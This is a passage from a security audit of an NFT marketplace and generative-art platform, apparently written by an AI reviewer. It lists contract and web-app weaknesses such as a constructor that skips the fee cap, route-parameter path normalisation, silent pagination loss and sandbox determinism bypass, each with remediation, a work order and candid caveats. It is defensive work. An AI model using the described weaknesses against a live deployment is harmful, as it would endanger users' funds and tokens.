**Fix.** Log full errors server-side; return a generic message and a correlation id to the caller.

---

<a name="m10"></a>
## M10 — Medium: marketplace constructor skips the fee ceiling

**File:** `contract/marketplace.py:98-116` vs `393-406`

`set_fee` enforces `assert fee_bps <= 1000, "FEE_TOO_HIGH"`. `__init__` accepts `fee_bps` with no check at all.

A deployment with `fee_bps > 10000` makes `fee = sp.split_tokens(sp.amount, fee_bps, 10000)` exceed `sp.amount`, so `remaining = sp.amount - fee` underflows and **every buy and every accept_offer fails** until an admin calls `set_fee`. Values between 1000 and 10000 silently exceed the ceiling the contract advertises as enforced.

`deploy.ts:207-210` does guard this (`if (feeBps > 1000) … REFUSING`), which is good — but that is a check in a script, not in the contract, and the contract is what the docstring makes promises about ("Capped by the contract so no future administrator can turn it into a toll"). Add `assert fee_bps <= 1000` to `__init__`.

---

<a name="low"></a>
## Low severity and hygiene

**L1 — `X-Frame-Options = "ALLOWALL"`** (`netlify.toml:19`). Not a valid value; the header only accepts `DENY` and `SAMEORIGIN`. Browsers ignore it, which happens to be the intent, but relying on an invalid header to mean "no restriction" is fragile. Delete it and use CSP `frame-ancestors` instead.

**L2 — Unvalidated route params in API paths.** `src/lib/tzkt.ts:44` builds `new URL(\`${tzktApi()}${path}\`)` where `path` embeds `contract`/`address` taken straight from Next route params (`/piece/[contract]/[tokenId]`, `/collection/[address]`). `new URL` normalises `..` segments, so a crafted param can redirect the request to a different TzKT endpoint. Impact is low — TzKT data is public and the host cannot be changed — but no code path validates that an address matches `^(tz[123]|KT1)[A-Za-z0-9]{33}$`. Add that check at every entry point; it also closes the door on the class of problems in [C2](#c2).

**L3 — `next.config.ts` `remotePatterns` is unused.** The allowlist constrains `next/image`; the codebase uses raw `<img>` everywhere with an eslint-disable. Either adopt `next/image` or drop the config so it does not read as a control that exists.

**L4 — `hexToUtf8` fails silently.** `provider.mts:55-59` and `src/utils/ipfs.ts:26-37` both do `parseInt(b, 16)` per byte pair. Non-hex input yields `NaN`, which `Uint8Array` coerces to `0`; odd-length input drops a nibble. Malformed chain data becomes plausible-looking garbage rather than a detectable error. Validate `/^[0-9a-fA-F]*$/` and even length, and throw.

**L5 — Fixed pagination windows silently drop work.** `provider.mts` uses `limit: 200` for tokens (line 115), `limit: 200` for `buy` events in both `mintOperationHash` (line 150) and `buyParams` (line 166), and `limit: 1000` for `set_provider` events (line 69). A collection past 200 mints will have tokens whose seed lookup returns `null`, so `pendingIn` skips them (line 123) and **they never reveal, permanently and silently.** Paginate properly, or query the specific token rather than scanning.

**L6 — `parseInt` on mutez.** Covered under [M8](#m8); use `BigInt` for chain amounts throughout (`market.ts`, `collection.ts`, `piece.ts`).

**L7 — Substantial dead and drifted code.** Beyond [H2](#h2):
- `src/components/studio/SandboxFrame.tsx` imports three modules from `src/lib/aleatory/`, a directory that does not exist. This file cannot compile.
- `src/lib/publish.ts` (452 lines) builds `create_token` + `mint_tokens` batched operations against a contract shape that `aleatory.py` does not implement — the deployed collection mints via `buy`. It references storage keys (`aleatory:code`, `aleatory:record`, `aleatory:params`) that appear nowhere in the contracts.
- `src/legacy/AleatoryLabPage.tsx` (1981 lines) is unrouted.
- `src/lib/runtime.ts` (428 lines) and `src/lib/sandbox.ts` are reachable only from the broken `SandboxFrame`.

That is roughly 3,000 lines of unreachable code, including two parallel sandbox implementations with materially different security properties. For a security review this is the most expensive kind of debt: it is not obvious from reading any single file which harness is the real one, and the more secure of the two is the dead one.

**L8 — Two copies of the sandbox shell.** `sandbox/index.html` and `public/sandbox/index.html` are byte-identical today and must be kept in sync by hand. A fix applied to one and not the other is a silent regression. Keep one and generate or symlink the other.

**L9 — Determinism is advisory, and the docs describe it as guaranteed.** The README says "the image an artist approves is produced by the code that produces the one on chain." The harness substitutes `Math.random` and freezes `Date`, but artist code runs *after* the harness and can restore both (`Math.random` is a plain writable property; a fresh iframe yields a pristine `Date`). A piece can therefore render one way in the sandbox preview and differently at reveal. Nothing in the pipeline compares the two. Consider having the provider render twice and compare digests before publishing, and soften the claim in the docs.

**L10 — Gateway hardcoded in the shell.** `public/sandbox/index.html:104` hardcodes `https://ipfs.fileship.xyz/`, ignoring `NEXT_PUBLIC_IPFS_GATEWAY`. A gateway rotation silently misses the sandbox, which is the one place it matters most.

**L11 — `admin_lambda` can brick fee withdrawal.** `aleatory.py:1121-1135` allows arbitrary transformation of factory storage, including setting `fees_accrued` above the actual contract balance, after which `withdraw_fees` fails permanently. Admin-only and self-inflicted, but the docstring's reasoning about what the lambda cannot reach should mention it.

**L12 — Null-handling in `collection/[address]/page.tsx`.** `collection` is used at lines 36, 44, 49, 54, 59, 61, 64 without narrowing after the `notFound()` guard, which TypeScript flags. `notFound()` does throw, so this is a type-narrowing gap rather than a live crash, but it will fail a strict build.

---

## Things that are done well

Worth recording, because they are load-bearing and should not be regressed:

- **`ALREADY_PUBLISHED` write-once** on `set_token_metadata` (`aleatory.py:620-622`) is the single control containing the blast radius of both [H1](#h1) and [H3](#h3). It works.
- **Marketplace escrow accounting is correct.** I traced every payout path: balances are consistent, ids are never reused, the royalty budget clamp bounds payouts and prevents the mutez underflow, and re-entrancy is not exploitable because state is committed before any `sp.send`.
- **No `admin_lambda` on the marketplace**, with the reasoning stated. That is the right call for a contract holding other people's property, and the asymmetry with the factory is well argued.
- **Two-step admin handoff** (`propose_admin`/`accept_admin`) on every administered contract.
- **`sp.amount == sp.mutez(0)` asserted on every non-payable entrypoint** — consistently, across all five contracts. This is frequently missed and it is not missed here.
- **`set_edition_size` reasons correctly about `0` meaning open**, and the comment explains why the naive comparison gets it backwards.
- **Live `get_agent` lookup in `may_write_media_`** rather than trusting the snapshot, so a rotated key revokes immediately — with a documented fallback for a dead provider.
- **Fees accrue rather than forward**, so a hostile treasury cannot break trading or deploys.
- **Deploy-time guards** in `deploy.ts` for network mismatch and fee ceiling, with blunt refusal messages.
- **No secrets in the repository or in git history.** `.env` is gitignored and untracked; a scan of all tracked files and the full history for `edsk`/`spsk`/JWT/AWS key patterns came back clean.
- **React handles all chain-derived strings**, so there is no XSS in the rendered pages themselves. The one injection is in the hand-written sandbox shell, not in the React tree.
- **The `params.ts` resolution rule** is genuinely well specified — canonical ordering, clamping, quantisation, and a stated reason why resolution happens in exactly one place. It deserves to be wired into the mint flow.

---

## Recommended order of work

**Before any further deployment:**
1. [C1](#c1) — remove the sandbox shell from `public/`, restrict `?code=` to `ipfs://`, add the top-level-navigation guard.
2. [C3](#c3) — verify collection storage before queueing work; never trust an event payload's self-assertion.
3. [C2](#c2) — restrict `code_uri` fetches to `ipfs://` with a size cap and timeout.
4. [H1](#h1) — authenticate the provider endpoint and add a real claim mechanism, or delete the docstring's claim.

**Before mainnet:**
5. [H2](#h2), [H5](#h5) — fix both CSPs and add app-origin security headers.
6. [H4](#h4) — filter the market UI to known collections (front-end fix ships immediately; the contract-level fix needs a redeploy, and the marketplace has no escape hatch).
7. [H3](#h3), [M10](#m10), [M3](#m3) — contract changes, batched into one revision since they all require a redeploy.
8. [M7](#m7) — audit the shadownet keys, confirm whether the collapsed-default path was taken, rotate if so.

**Ongoing:**
9. [M1](#m1), [M2](#m2), [M4](#m4), [M5](#m5), [M6](#m6), [M8](#m8), [M9](#m9).
10. [L7](#low) — delete the dead code. Two sandbox implementations with different security properties is the condition under which the next reviewer misses something.

---

## Caveats

- SmartPy would not load in this environment, so the contracts were not compiled and the test suite was not run. **One thing I could not resolve and that you should verify:** `AleatoryCollection` inherits `main.Nft` from `fa2_lib`. If that base class contributes a `mint` entrypoint (rather than that living in a separate `MintNft` mixin), the artist could mint outside `buy`, bypassing `edition_size`, payment, and the seed binding. Compile and enumerate the entrypoints of `contract/build/AleatoryCollection/step_001_cont_0_contract.json` to confirm the surface is exactly what the source implies.
- No dynamic testing was performed: no requests to the deployed shadownet contracts, the render worker, or the Netlify function. Every finding is from source.
- `node_modules` is absent, so no dependency-vulnerability scan was run. Do that separately — `npm audit` plus a lockfile review, and note [M5](#m5) first, since two dependencies are currently invisible to it.
